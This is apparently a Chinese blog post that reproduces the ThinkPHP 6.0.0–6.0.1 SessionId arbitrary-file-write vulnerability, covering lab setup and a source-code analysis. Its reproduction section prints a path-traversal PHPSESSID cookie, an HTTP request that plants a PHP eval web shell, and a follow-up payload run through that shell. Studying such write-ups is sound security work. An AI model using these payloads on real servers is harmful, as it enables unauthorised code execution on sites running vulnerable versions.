@@ -1,0 +1,272 @@
+---
+layout:	post
+title:	"ThinkPHP6任意文件操作漏洞"
+date:	2020-03-13 15:13:21 +0800
+tags:	ThinkPHP 漏洞复现
+color:	rgb(255,210,32)
+cover:	'../assets/blog_pic/20200313_thinkphp6.0/ID-INVADED.png'
+subtitle:	'Ubuntu+PHP7.1+ThinkPHP6.0.0复现任意文件操作漏洞'
+---
+
+
+
+👻2020年1月10日，ThinkPHP团队发布一个补丁更新，修复了一处由不安全的SessionId导致的任意文件操作漏洞。该漏洞允许攻击者在目标环境启用session的条件下创建任意文件以及删除任意文件，在特定情况下还可以getshell
+
+具体受影响版本为ThinkPHP6.0.0-6.0.1
+
+👻最早是看别人写了如何复现的，然后这几天搭建Ubuntu+PHP7.1+ThinkPHP6.0.0并复现这个任意文件操作漏洞
+
+主要归纳为追踪SessionId怎么就可以篡改啦
+
+在什么特定情况下可以getshell啦
+
+
+
+## 环境准备
+
+- PHP7.1
+
+  ```
+  $ sudo apt-get -y install php7.1
+  ```
+
+  ![avatar](../../assets/blog_pic/20200313_thinkphp6.0/php7.1.png)
+
+- [ThinkPHP6](https://www.kancloud.cn/manual/thinkphp6_0/1037481 )
+
+  安装`Composer`
+
+  ```
+  $ curl -sS https://getcomposer.org/installer | php
+  ```
+
+  如果有什么乱七八糟错误，可以试一试
+
+  ```
+  $ sudo curl -sS https://getcomposer.org/installer | sudo php -d detect_unicode=Off
+  ```
+
+  然后移动
+
+  ```
+  $ mv composer.phar /usr/local/bin/composer
+  ```
+
+  修改源为阿里源
+
+  ```
+  $ composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/
+  ```
+
+  安装ThinkPHP6.0
+
+  💢坑：这里不需要写`topthink/think=6.0.0dev`，不然会失败，版本可以在安装完之后修改配置文件进行版本覆盖
+
+  ```
+  $ composer create-project topthink/think=6.0.x-dev tp
+  ```
+
+  💢坑：
+
+  ![avatar](../../assets/blog_pic/20200313_thinkphp6.0/keng_1.png)
+
+  蛤？🙄搞不明白，还改了半天php的配置文件，把extension=php_fileinfo.dll的勾掉，其实不需要，[参考这篇文章](https://blog.csdn.net/u014132947/article/details/80258099?depth_1-utm_source=distribute.pc_relevant.none-task&utm_source=distribute.pc_relevant.none-task)，增加`--ignore-platform-reqs`
+
+  ```
+  $ sudo composer --ignore-platform-reqs create-project topthink/think=6.0.x-dev tp
+  ```
+  
+  就好惹😍
+  ![avatar](../../assets/blog_pic/20200313_thinkphp6.0/thinkphpok.png)
+  
+  cd进入安装好的tp
+  
+  ```
+  $ php think run
+  ```
+  
+  访问http://localhost:8000/，此时是最新的6.0.2版本
+  
+  ![avatar](../../assets/blog_pic/20200313_thinkphp6.0/ojbk.png)
+  
+  修改为6.0.1版本，将`/app/composer.json:24`修改为
+
+  ```
+  "topthink/framework": "6.0.0",
+  ```
+  
+  然后执行将版本覆盖为6.0.0
+  
+  ```
+  $ composer update
+  ```
+  
+  再次
+  
+  ```
+  $ php think run
+  ```
+  
+  http://localhost:8000/就会是6.0.0版本了
+  
+  
+
+## 洞析（漏洞分析）
+
+参考：
+
+[ThinkPHP6 任意文件操作漏洞分析](https://hacpai.com/article/1579965339516)
+
+[ThinkPHP6任意文件操作漏洞分析](https://mp.weixin.qq.com/s/UPu6cE20l24T6fkYOlSUJw)
+
+😒咋两篇名字一样
+
+- 官方信息：ThinkPHP 发布的补丁声称修复了一处由于不安全的 SessionId 导致的任意文件操作漏洞：在开启 Session 的情况下可以导致创建任意文件以及删除任意文件，特定情况下可以 getshell。
+
+- 根据这些信息，我们到官方 GitHub 的 commit 页面找一下相关的提交记录：
+
+  ![avatar](../../assets/blog_pic/20200313_thinkphp6.0/thinkphpgit.png)
+
+  在src/think/session/Store.php 中 212 行在设置 `id` 时增加了一个函数：`ctype_alnum($text)`，这个函数就是判断所有的字符全部是字母和(或者)数字，返回 TRUE 否则返回 FALSE，所以可能是存储 Session 时导致的文件写入
+
+- 跟进找一下相关的函数
+
+  可以看到 `vendor/topthink/framework/src/think/session/Store.php:254` 的 save()函数
+
+  ![avatar](../../assets/blog_pic/20200313_thinkphp6.0/fenxi_1.png)
+
+  263行write写入sessionId，265行delete删除sessionId，继续跟进write函数，在`vendor/topthink/framework/src/think/session/driver/File.php:210`
+
+  ![avatar](../../assets/blog_pic/20200313_thinkphp6.0/fenxi_2.png)
+
+  从`$sessID`来`getFileName`，然后直接`writeFile`写入，继续追踪`writeFile`函数，还是在File.php下
+
+  ![avatar](../../assets/blog_pic/20200313_thinkphp6.0/fenxi_3.png)
+
+  可以看到调用了 `file_put_contents()` 函数，这里是真正写入文件的操作了
+
+  ```
+  file_put_contents($path, $content, LOCK_EX);
+  ```
+
+  ![avatar](../../assets/blog_pic/20200313_thinkphp6.0/file_put_contents.png)
+
+  如果文件名不存在，则创建文件，否则现有文件将被覆盖，除非设置了FILE_APPEND标志。
+
+- 分析：
+
+  - 函数 `file_put_contents($path,$content,LOCK_EX)` 中参数 `$path,$content` 来源于函数 `writeFile($path,$data)`
+
+  - 函数 `writeFile($path,$data)` 中参数 `$path,$data` 来源于函数 `write(String $sessionID,String $sessiData)`
+
+  - 函数 `write(String $sessionID,String $sessiData)` 中参数 `$sessionID,$sessiData` 来源于 `save()` 中调用了 `write()`，同时传入的参数 `$sessionId` 的值是调用 `getId()` 传入的
+
+  综上，文件名来源于 `$sessionId`，当传入的 id 值长度为 32 ，创建 `sessionId`，然后进行 `gitId()`，就是这里判断不足
+
+  ![avatar](../../assets/blog_pic/20200313_thinkphp6.0/session32.png)
+
+- 接下来找调用 `setId()` 的地方`vendor/topthink/framework/src/think/middleware/SessionInit.php:46`
+
+  ![avatar](../../assets/blog_pic/20200313_thinkphp6.0/sessionid.png)
+  
+  其中 `cookieName` 的值为 `PHPSESSID`， `$sessionId` 是 `cookie` 中名为 `PHPSESSID` 的值，因此是攻击者可控的，从而导致写入的文件名可控。
+  
+  但是默认环境下，`session` 的内容由 `vendor/topthink/framework/src/think/session/Store.php:261` 的变量 `$data` 传入：
+  
+  ![avatar](../../assets/blog_pic/20200313_thinkphp6.0/fenxi_4.png)
+  
+  `$data` 在默认环境中为空:
+  
+  ![avatar](../../assets/blog_pic/20200313_thinkphp6.0/fenxi_5.png)
+  
+  所以，可利用的条件比较苛刻
+  
+
+  👹一是默认情况下是不开启session的，开启session才可以实现任意文件操作
+
+  👹二是写入的 session内容是由实际的后端业务逻辑来决定，只有特定情况才能getshell
+
+  那接下来就get一下shell吧
+
+## 复现漏洞
+
+- 修改`app/composer/Index.php`，加一句
+
+  ```
+  session('sueisok',"1");
+  ```
+  
+  ![avatar](../../assets/blog_pic/20200313_thinkphp6.0/sueisok.png)
+
+- 开启session，去掉`app/middleware.php:9`中的注释
+
+  ![avatar](../../assets/blog_pic/20200313_thinkphp6.0/middleware.png)
+  
+- 访问，抓包，将`PHPSESSID`改为目录地址
+  
+  ```
+  Cookie: PHPSESSID=../../../../public/sueisokkk.php
+  ```
+  
+  💢坑：这里的`PHPSESSID`一定要是32位的
+  
+  ![avatar](../../assets/blog_pic/20200313_thinkphp6.0/okkkphp.png)
+  
+  `runtime/session/`下会生成的session😀
+  
+  ![avatar](../../assets/blog_pic/20200313_thinkphp6.0/runtimesession.png)
+  
+- 来恶意操作一下，把`app/composer/Index.php`里写入
+  
+  ```
+  session('sueisok',$_GET["c"]);
+  ```
+  
+  ![avatar](../../assets/blog_pic/20200313_thinkphp6.0/getc.png)
+  
+  访问，抓包，数据包内容
+  
+  ```
+  GET /index.php?s=index/index&c=%3C?php%20eval($_GET[a]);?%3E HTTP/1.1
+  Host: 172.16.70.244:8000
+  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3835.0 Safari/537.36
+  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+  Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+  Accept-Encoding: gzip, deflate
+  Connection: close
+  Cookie: PHPSESSID=../../../../public/sueisokkk.php
+  Upgrade-Insecure-Requests: 1
+  Cache-Control: max-age=0
+  ```
+  
+  ![avatar](../../assets/blog_pic/20200313_thinkphp6.0/eval.png)
+  
+  200之后，在`public/`下写入了名为`sueisokkk.php`的文件，在浏览器中访问构造带有payload的链接：
+  
+  ```
+  http://xxx.xxx.xxx.xxx:8000/sueisokkk.php?a=fwrite(fopen(%22aa.txt%22,%20%22w%22),%22hello,world!%22);
+  ```
+  
+  就在`public/`下写入了名为`aa.txt`内容为`hello,world`的文件
+  
+  ![avatar](../../assets/blog_pic/20200313_thinkphp6.0/helloworld.png)
+  
+
+😇此时的心情彷佛春天来到
+
+## 其他的坑
+
+- 💢如果修改了session以后，http://localhost:8000访问之后出错，就要试一下
+
+  ```
+  $ sudo php think run
+  ```
+
+- 💢如果`runtime/session/`下没有生成的session，那就应该是文件夹写的权限不够，我是直接给了777
+
+  ```
+  $ sudo chmod 777 /runtime/session/
+  ```
+
+所以能任意写入文件getshell的条件还是很苛刻的
+
